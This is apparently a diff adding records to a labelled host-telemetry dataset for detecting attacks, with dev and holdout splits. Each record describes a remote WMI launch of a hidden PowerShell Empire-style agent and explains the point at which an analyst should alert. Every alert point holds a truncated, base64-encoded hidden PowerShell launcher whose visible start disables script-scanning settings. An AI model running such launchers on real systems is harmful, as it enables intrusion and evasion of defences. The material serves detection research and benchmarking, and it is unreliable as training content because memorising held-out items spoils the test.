+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAcwBJAE8ATgAuAE0AYQBKAG8AcgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAEYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0A"
+  },
+  "ancestry": [],
+  "lead_up": [
+   {
+    "name": "The attacker's machine finds this computer and connects",
+    "n_events": 4,
+    "ts": "2000-04-03T14:44:59.927-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI starts a hidden, encoded PowerShell",
+    "n_events": 6,
+    "ts": "2000-04-03T14:45:00.035-04:00"
+   },
+   {
+    "step": 2,
+    "name": "Windows records the attacker's network logons",
+    "n_events": 17,
+    "ts": "2000-04-03T14:45:00.06-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The agent starts up, turns off script scanning, contacts its server and describes the machine",
+    "n_events": 34,
+    "ts": "2000-04-03T14:45:03.075-04:00"
+   },
+   {
+    "step": 4,
+    "name": "Windows housekeeping for the attacker's PowerShell files",
+    "n_events": 5,
+    "ts": "2000-04-03T14:45:09.021-04:00"
+   },
+   {
+    "step": 5,
+    "name": "The attacker's remote logons close",
+    "n_events": 4,
+    "ts": "2000-04-03T14:45:13.926-04:00"
+   },
+   {
+    "step": 6,
+    "name": "The agent beacons to its server every five seconds",
+    "n_events": 2647,
+    "ts": "2000-04-03T14:45:13.976-04:00"
+   },
+   {
+    "step": 7,
+    "name": "The attacker's machine connects briefly again",
+    "n_events": 4,
+    "ts": "2000-04-03T14:47:58.589-04:00"
+   },
+   {
+    "step": 8,
+    "name": "The agent receives a final order, answers and exits",
+    "n_events": 15,
+    "ts": "2000-04-03T15:23:11.774-04:00"
+   },
+   {
+    "step": 9,
+    "name": "The attacker's last remote logon closes",
+    "n_events": 1,
+    "ts": "2000-04-03T15:23:12.275-04:00"
+   }
+  ],
+  "n_malicious": 2733,
+  "n_context": 4
+ },
+ {
+  "source": "train",
+  "machine": "host-9935",
+  "split": "dev",
+  "attack_id": "atk-5b535f",
+  "name": "Remote WMI launch of a hidden PowerShell Empire agent that beacons to its server",
+  "alert_from": "2000-01-22T14:44:59.289-04:00",
+  "why_alert_from": "Before this event the expert has seen name-lookup answers to another workstation, a Kerberos check with the domain controller and a burst of network logons of an administrator account with some anonymous logons. Remote administrators produce exactly this every day, so it does not show intent. At this event the WMI service starts PowerShell with a hidden window and a base64-encoded command. WMI almost never starts PowerShell and legitimate administration does not hide its command this way, so this event is enough to conclude this is an attack.",
+  "alert_point": {
+   "id": "e09d8873-515c-cbd7-e4c5-5cb778c302cd",
+   "ts": "2000-01-22T14:44:59.289-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\zleazer",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\zleazer",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAcwBJAE8ATgAuAE0AYQBKAG8AcgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAEYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0A"
+  },
+  "ancestry": [],
+  "lead_up": [
+   {
+    "name": "The attacker's machine finds this computer and logs on over the network",
+    "n_events": 20,
+    "ts": "2000-01-22T14:44:58.222-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI starts a hidden, encoded PowerShell",
+    "n_events": 6,
+    "ts": "2000-01-22T14:44:59.289-04:00"
+   },
+   {
+    "step": 2,
+    "name": "One more network logon from the attacker's machine",
+    "n_events": 1,
+    "ts": "2000-01-22T14:45:01.385-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The agent starts up, turns off script scanning, contacts its server and describes the machine",
+    "n_events": 34,
+    "ts": "2000-01-22T14:45:02.317-04:00"
+   },
+   {
+    "step": 4,
+    "name": "Windows housekeeping for the attacker's PowerShell files",
+    "n_events": 12,
+    "ts": "2000-01-22T14:45:07.371-04:00"
+   },
+   {
+    "step": 5,
+    "name": "The attacker's remote logons close",
+    "n_events": 4,
+    "ts": "2000-01-22T14:45:08.895-04:00"
+   },
+   {
+    "step": 6,
+    "name": "The agent beacons to its server every five seconds",
+    "n_events": 2642,
+    "ts": "2000-01-22T14:45:11.617-04:00"
+   },
+   {
+    "step": 7,
+    "name": "The attacker's machine connects briefly again",
+    "n_events": 4,
+    "ts": "2000-01-22T14:47:58.653-04:00"
+   },
+   {
+    "step": 8,
+    "name": "The agent receives a final order, answers and exits; its last logon closes",
+    "n_events": 17,
+    "ts": "2000-01-22T15:23:07.168-04:00"
+   }
+  ],
+  "n_malicious": 2720,
+  "n_context": 20
+ },
+ {
+  "source": "train",
+  "machine": "host-8875",
+  "split": "dev",
+  "attack_id": "atk-7adfe0",
+  "name": "Remote WMI launch of a hidden PowerShell Empire agent that beacons to its server",
+  "alert_from": "2000-12-25T14:44:56.365-04:00",
+  "why_alert_from": "Before this event the expert has seen only name-lookup answers to another workstation, the domain controller checking credentials, and an administrator network logon of a domain account from that workstation. Remote admin logons happen in normal IT work and say nothing about intent. At this event the WMI service starts PowerShell with a hidden window and a base64-encoded command. WMI rarely starts PowerShell and legitimate administration does not hide its command this way, so this single event, following the remote logon, is enough to conclude this is an attack.",
+  "alert_point": {
+   "id": "aead2c8d-65fa-457e-4d49-dd4b72a41590",
+   "ts": "2000-12-25T14:44:56.365-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\zleazer",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\zleazer",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAcwBJAE8ATgAuAE0AYQBKAG8AcgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAEYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0A"
+  },
+  "ancestry": [],
+  "lead_up": [
+   {
+    "name": "The attacker's machine finds this computer and logs on",
+    "n_events": 7,
+    "ts": "2000-12-25T14:44:56.102-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI starts a hidden, encoded PowerShell",
+    "n_events": 3,
+    "ts": "2000-12-25T14:44:56.365-04:00"
+   },
+   {
+    "step": 2,
+    "name": "Windows records the attacker's other network logons",
+    "n_events": 16,
+    "ts": "2000-12-25T14:44:56.448-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The agent starts up, turns off script scanning, contacts its server and describes the machine",
+    "n_events": 37,
+    "ts": "2000-12-25T14:44:56.514-04:00"
+   },
+   {
+    "step": 4,
+    "name": "Windows housekeeping for the attacker's PowerShell and its console",
+    "n_events": 12,
+    "ts": "2000-12-25T14:45:05.615-04:00"
+   },
+   {
+    "step": 5,
+    "name": "The agent beacons to its server every five seconds",
+    "n_events": 2637,
+    "ts": "2000-12-25T14:45:09.866-04:00"
+   },
+   {
+    "step": 6,
+    "name": "The attacker's remote logons close",
+    "n_events": 3,
+    "ts": "2000-12-25T14:45:22.47-04:00"
+   },
+   {
+    "step": 7,
+    "name": "The attacker's machine connects briefly again",
+    "n_events": 4,
+    "ts": "2000-12-25T14:47:58.77-04:00"
+   },
+   {
+    "step": 8,
+    "name": "The agent receives a final order, answers and exits",
+    "n_events": 16,
+    "ts": "2000-12-25T15:23:08.149-04:00"
+   },
+   {
+    "step": 9,
+    "name": "The attacker's last remote logon closes",
+    "n_events": 1,
+    "ts": "2000-12-25T15:23:08.844-04:00"
+   }
+  ],
+  "n_malicious": 2729,
+  "n_context": 7
+ },
+ {
+  "source": "train",
+  "machine": "host-eaa4",
+  "split": "dev",
+  "attack_id": "atk-d31c37",
+  "name": "Remote WMI launch of a PowerShell implant, C2 beaconing, ping sweep and WMI lateral movement",
+  "alert_from": "2000-09-27T13:23:30.78-04:00",
+  "why_alert_from": "This is the first event of the attack proper: the WMI service, which normally only answers routine management queries, starts a hidden PowerShell (window hidden, no profile) as the domain Administrator with a long base64-encoded command. Remote WMI starting an encoded hidden PowerShell is a well-known attack pattern and is enough on its own for an expert to alert. The only attack events before it are a single short network logon as zleazer from 10.220.246.171 four minutes earlier and its RPC connection; a brief network logon from another domain machine looks ordinary and does not justify an alert by itself.",
+  "alert_point": {
+   "id": "2e8fc8e0-4a23-829a-7e42-83fa731f1237",
+   "ts": "2000-09-27T13:23:30.78-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\Administrator",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\Administrator",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAUwBJAE8ATgBUAGEAQgBMAEUALgBQAFMAVgBFAFIAcwBJAE8ATgAuAE0AQQBqAE8AcgAgAC0ARwBFACAAMwApAHsAJABHAFAARgA9AFsAcgBlAGYAXQAuAEEAUwBTAEUATQBCAGwAWQAuAEcARQB0AFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0A"
+  },
+  "ancestry": [],
+  "lead_up": [
+   {
+    "name": "Attacker's machine makes a brief remote logon",
+    "n_events": 3,
+    "ts": "2000-09-27T13:19:42.161-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "Attacker starts a hidden encoded PowerShell through WMI",
+    "n_events": 14,
+    "ts": "2000-09-27T13:23:30.78-04:00"
+   },
+   {
+    "step": 2,
+    "name": "Agent switches off script scanning",
+    "n_events": 12,
+    "ts": "2000-09-27T13:23:33.211-04:00"
+   },
+   {
+    "step": 3,
+    "name": "Agent contacts its C2 server and sets up encryption",
+    "n_events": 21,
+    "ts": "2000-09-27T13:23:36.976-04:00"
+   },
+   {
+    "step": 4,
+    "name": "Agent beacons to the C2 server",
+    "n_events": 2951,
+    "ts": "2000-09-27T13:23:44.926-04:00"
+   },
+   {
+    "step": 5,
+    "name": "Agent scans the local network with ping",
+    "n_events": 1464,
+    "ts": "2000-09-27T13:29:20.768-04:00"
+   },
+   {
+    "step": 6,
+    "name": "Agent spreads to another host through WMI",
+    "n_events": 7,
+    "ts": "2000-09-27T13:34:15.93-04:00"
+   },
+   {
+    "step": 7,
+    "name": "Agent renegotiates and exits",
+    "n_events": 23,
+    "ts": "2000-09-27T14:05:12.907-04:00"
+   }
+  ],
+  "n_malicious": 4492,
+  "n_context": 3
+ },
+ {
+  "source": "train",
+  "machine": "host-f59c",
+  "split": "holdout",
+  "attack_id": "atk-892458",
+  "name": "Remote WMI launch of an encoded PowerShell Empire agent that beacons to its server",
+  "alert_from": "2000-12-08T15:41:17.292-04:00",
+  "why_alert_from": "Before this event the expert has seen only name-lookup answers to another local machine and a handful of Administrator and anonymous network logons from it, which look like ordinary remote administration. At this event the WMI service starts PowerShell with no profile and a base64-encoded command. WMI rarely starts PowerShell and legitimate administration does not hide its command this way, so this single event, coming right after the remote logons, is enough to conclude this is an attack.",
+  "alert_point": {
+   "id": "140708e6-9a82-55bc-9da1-be699feba095",
+   "ts": "2000-12-08T15:41:17.292-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\Administrator",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\Administrator",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBFAHIAcwBJAG8AbgBUAEEAYgBMAEUALgBQAFMAVgBFAFIAUwBpAE8ATgAuAE0AQQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBTAEUAbQBiAEwAWQAuAEcARQB0AFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAEkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB"
+  },
+  "ancestry": [
+   {
+    "image": "wmiprvse.exe",
+    "command_line": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+    "user": "NT AUTHORITY\\NETWORK SERVICE",
+    "ts": "2000-12-08T10:09:01.546-04:00"
+   },
+   {
+    "image": "svchost.exe",
+    "command_line": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "ts": "2000-12-08T10:09:01.503-04:00"
+   }
+  ],
+  "lead_up": [
+   {
+    "name": "The attacker's machine finds this computer and logs in over the network",
+    "n_events": 19,
+    "ts": "2000-12-08T15:41:16.755-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI starts an encoded PowerShell command",
+    "n_events": 7,
+    "ts": "2000-12-08T15:41:17.292-04:00"
+   },
+   {
+    "step": 2,
+    "name": "One more anonymous logon from the attacker's machine",
+    "n_events": 1,
+    "ts": "2000-12-08T15:41:18.336-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The agent starts up and turns off script scanning",
+    "n_events": 12,
+    "ts": "2000-12-08T15:41:20.355-04:00"
+   },
+   {
+    "step": 4,
+    "name": "The agent contacts its server, sets up encryption and describes the machine",
+    "n_events": 21,
+    "ts": "2000-12-08T15:41:22.865-04:00"
+   },
+   {
+    "step": 5,
+    "name": "Windows housekeeping for the attacker's PowerShell and console helper",
+    "n_events": 12,
+    "ts": "2000-12-08T15:41:24.945-04:00"
+   },
+   {
+    "step": 6,
+    "name": "The attacker's remote logons close",
+    "n_events": 4,
+    "ts": "2000-12-08T15:41:31.19-04:00"
+   },
+   {
+    "step": 7,
+    "name": "The agent beacons to its server every 30 seconds until the end of the day",
+    "n_events": 5954,
+    "ts": "2000-12-08T15:41:56.311-04:00"
+   },
+   {
+    "step": 8,
+    "name": "The attacker's machine connects briefly again",
+    "n_events": 4,
+    "ts": "2000-12-08T15:44:20.879-04:00"
+   }
+  ],
+  "n_malicious": 6015,
+  "n_context": 19
+ },
+ {
+  "source": "train",
+  "machine": "host-3c03",
+  "split": "holdout",
+  "attack_id": "atk-48400a",
+  "name": "Remote WMI launch of a hidden PowerShell Empire agent that beacons to its server",
+  "alert_from": "2000-12-22T14:44:59.171-04:00",
+  "why_alert_from": "This is the attack's first recorded event: the WMI service host starts PowerShell with a hidden window, no profile and a base64-encoded command, on behalf of a remote user. WMI rarely starts PowerShell and legitimate administration does not hide and encode its commands this way, so this event alone is enough to call an attack. There is no earlier attack event: the attacker's logon records and name-lookup answers are written a moment after it (telemetry delay), so nothing of the attack is seen before it.",
+  "alert_point": {
+   "id": "7044f37b-b06b-1516-fc59-67642d040ffd",
+   "ts": "2000-12-22T14:44:59.171-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\zleazer",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\zleazer",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAcwBJAE8ATgAuAE0AYQBKAG8AcgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAEYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0A"
+  },
+  "ancestry": [],
+  "lead_up": [],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI starts a hidden, encoded PowerShell",
+    "n_events": 6,
+    "ts": "2000-12-22T14:44:59.171-04:00"
+   },
+   {
+    "step": 2,
+    "name": "Windows records the attacker's network logons",
+    "n_events": 20,
+    "ts": "2000-12-22T14:45:00.422-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The hidden PowerShell starts up and turns off script scanning",
+    "n_events": 14,
+    "ts": "2000-12-22T14:45:01.831-04:00"
+   },
+   {
+    "step": 4,
+    "name": "The attacker's machine opens one more anonymous session",
+    "n_events": 1,
+    "ts": "2000-12-22T14:45:06.328-04:00"
+   },
+   {
+    "step": 5,
+    "name": "The launcher contacts its server, downloads the next stage and sets up encryption",
+    "n_events": 23,
+    "ts": "2000-12-22T14:45:06.433-04:00"
+   },
+   {
+    "step": 6,
+    "name": "The agent beacons to its server every five seconds",
+    "n_events": 2652,
+    "ts": "2000-12-22T14:45:13.373-04:00"
+   },
+   {
+    "step": 7,
+    "name": "Windows housekeeping for the attacker's PowerShell",
+    "n_events": 6,
+    "ts": "2000-12-22T14:45:13.819-04:00"
+   },
+   {
+    "step": 8,
+    "name": "The attacker's first remote logons close",
+    "n_events": 4,
+    "ts": "2000-12-22T14:45:13.957-04:00"
+   },
+   {
+    "step": 9,
+    "name": "The attacker's machine connects briefly again",
+    "n_events": 4,
+    "ts": "2000-12-22T14:47:58.594-04:00"
+   },
+   {
+    "step": 10,
+    "name": "The agent receives one last message, replies and exits",
+    "n_events": 17,
+    "ts": "2000-12-22T15:23:09.61-04:00"
+   }
+  ],
+  "n_malicious": 2747,
+  "n_context": 0
+ },
+ {
+  "source": "train",
+  "machine": "host-9ba4",
+  "split": "dev",
+  "attack_id": "atk-630671",
+  "name": "Remote WMI launch of a hidden PowerShell Empire agent that beacons to its server",
+  "alert_from": "2000-02-12T14:44:55.055-04:00",
+  "why_alert_from": "This is the first event of the attack on this machine: no lookup or logon from the attacker's computer is recorded before it (the logon records are written 1.7 seconds later). At this event the WMI service starts PowerShell with a hidden window and a base64-encoded command. WMI almost never starts PowerShell (the only other PowerShell all day is a short service check started from a command prompt), and legitimate administration does not hide its command this way, so this single event is enough to conclude this is an attack. There is no earlier attack event, so nothing before it could have been enough.",
+  "alert_point": {
+   "id": "3b499248-664c-fad1-b4eb-f483edbd124f",
+   "ts": "2000-02-12T14:44:55.055-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\zleazer",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\zleazer",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAcwBJAE8ATgAuAE0AYQBKAG8AcgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAEYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0A"
+  },
+  "ancestry": [],
+  "lead_up": [],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI starts a hidden, encoded PowerShell",
+    "n_events": 6,
+    "ts": "2000-02-12T14:44:55.055-04:00"
+   },
+   {
+    "step": 2,
+    "name": "Windows records the attacker's network logons",
+    "n_events": 23,
+    "ts": "2000-02-12T14:44:56.641-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The agent starts up, turns off script scanning, contacts its server and describes the machine",
+    "n_events": 34,
+    "ts": "2000-02-12T14:44:57.536-04:00"
+   },
+   {
+    "step": 4,
+    "name": "Windows housekeeping for the attacker's PowerShell prefetch file",
+    "n_events": 4,
+    "ts": "2000-02-12T14:45:03.947-04:00"
+   },
+   {
+    "step": 5,
+    "name": "The agent beacons to its server every five seconds",
+    "n_events": 2646,
+    "ts": "2000-02-12T14:45:10.787-04:00"
+   },
+   {
+    "step": 6,
+    "name": "Two of the attacker's remote logons close",
+    "n_events": 3,
+    "ts": "2000-02-12T14:45:22.485-04:00"
+   },
+   {
+    "step": 7,
+    "name": "The attacker's machine connects briefly again",
+    "n_events": 4,
+    "ts": "2000-02-12T14:47:58.754-04:00"
+   },
+   {
+    "step": 8,
+    "name": "The agent receives a final order, answers and exits",
+    "n_events": 16,
+    "ts": "2000-02-12T15:23:05.123-04:00"
+   },
+   {
+    "step": 9,
+    "name": "The attacker's last remote logon closes",
+    "n_events": 1,
+    "ts": "2000-02-12T15:23:07.246-04:00"
+   }
+  ],
+  "n_malicious": 2737,
+  "n_context": 0
+ },
+ {
+  "source": "train",
+  "machine": "host-f890",
+  "split": "dev",
+  "attack_id": "atk-7ee042",
+  "name": "Remote WMI launch of a hidden PowerShell Empire agent that beacons to its server",
+  "alert_from": "2000-08-09T14:44:59.248-04:00",
+  "why_alert_from": "By this event the expert has seen a remote network logon by a domain account with administrator privileges, followed by WMI's worker process starting PowerShell with a hidden window, no profile and a base64-encoded command. WMI almost never starts PowerShell, and never legitimately with an encoded, hidden command; this is a well-known remote-execution pattern of attack tools. One event earlier, all that had been seen was name lookups, a domain-controller check and an ordinary-looking administrator network logon, which happen routinely.",
+  "alert_point": {
+   "id": "5947bc2e-45a9-f7a0-f243-1615f247b53a",
+   "ts": "2000-08-09T14:44:59.248-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\zleazer",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\zleazer",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAcwBJAE8ATgAuAE0AYQBKAG8AcgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAEYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0A"
+  },
+  "ancestry": [],
+  "lead_up": [
+   {
+    "name": "The attacker's machine finds this computer and logs on",
+    "n_events": 7,
+    "ts": "2000-08-09T14:44:59.045-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI starts a hidden, encoded PowerShell",
+    "n_events": 6,
+    "ts": "2000-08-09T14:44:59.248-04:00"
+   },
+   {
+    "step": 2,
+    "name": "Windows records more remote logons from the attacker's machine",
+    "n_events": 15,
+    "ts": "2000-08-09T14:44:59.342-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The agent starts up, turns off script logging and scanning, contacts its server and describes the machine",
+    "n_events": 34,
+    "ts": "2000-08-09T14:45:02.728-04:00"
+   },
+   {
+    "step": 4,
+    "name": "Windows housekeeping for the attacker's PowerShell and console host",
+    "n_events": 9,
+    "ts": "2000-08-09T14:45:08.248-04:00"
+   },
+   {
+    "step": 5,
+    "name": "The agent beacons to its server every five seconds",
+    "n_events": 2647,
+    "ts": "2000-08-09T14:45:13.133-04:00"
+   },
+   {
+    "step": 6,
+    "name": "The attacker's first remote logons close",
+    "n_events": 4,
+    "ts": "2000-08-09T14:45:13.922-04:00"
+   },
+   {
+    "step": 7,
+    "name": "The attacker's machine connects briefly again",
+    "n_events": 4,
+    "ts": "2000-08-09T14:47:58.63-04:00"
+   },
+   {
+    "step": 8,
+    "name": "The agent receives a final order, answers and exits",
+    "n_events": 16,
+    "ts": "2000-08-09T15:23:07.995-04:00"
+   },
+   {
+    "step": 9,
+    "name": "The attacker's last remote logon closes",
+    "n_events": 1,
+    "ts": "2000-08-09T15:23:08.81-04:00"
+   }
+  ],
+  "n_malicious": 2736,
+  "n_context": 7
+ },
+ {
+  "source": "train",
+  "machine": "host-875d",
+  "split": "dev",
+  "attack_id": "atk-36c5c6",
+  "name": "Remote WMI launch of an in-memory PowerShell agent, credential theft, discovery and spread to the domain controller",
+  "alert_from": "2000-08-07T13:34:17.24-04:00",
+  "why_alert_from": "Before this event the expert has only seen a network logon by a domain user, with the usual Kerberos and remote-procedure traffic, which is how administrators normally connect. At this event the WMI service starts PowerShell with a hidden window, no profile and a base64-encoded command, a textbook remote-execution launcher, so the expert can conclude it is an attack. The logon events one step earlier did not justify that.",
+  "alert_point": {
+   "id": "cbd3d74d-0881-ad80-01f5-973af769c888",
+   "ts": "2000-08-07T13:34:17.24-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\zleazer",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\zleazer",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBJAG8AbgBUAGEAYgBsAEUALgBQAFMAVgBlAFIAUwBJAG8AbgAuAE0AQQBqAE8AUgAgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAcgBFAGYAXQAuAEEAcwBTAGUATQBiAGwAeQAuAEcAZQB0AFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAEkAZQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0A"
+  },
+  "ancestry": [],
+  "lead_up": [
+   {
+    "name": "Attacker logs in to this machine over the network",
+    "n_events": 9,
+    "ts": "2000-08-07T13:34:16.137-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI starts a hidden, encoded PowerShell",
+    "n_events": 6,
+    "ts": "2000-08-07T13:34:17.24-04:00"
+   },
+   {
